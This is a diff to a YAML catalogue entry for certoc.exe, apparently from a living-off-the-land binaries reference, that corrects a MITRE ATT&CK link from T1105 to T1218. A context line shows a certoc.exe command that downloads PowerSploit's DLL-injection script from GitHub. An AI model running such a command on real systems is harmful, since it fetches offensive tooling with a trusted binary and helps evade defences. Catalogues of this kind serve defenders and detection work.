@@ -10,7 +10,7 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/techniques/T1105/
+    MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows Server 2022
   - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
     Description: Downloads text formatted files
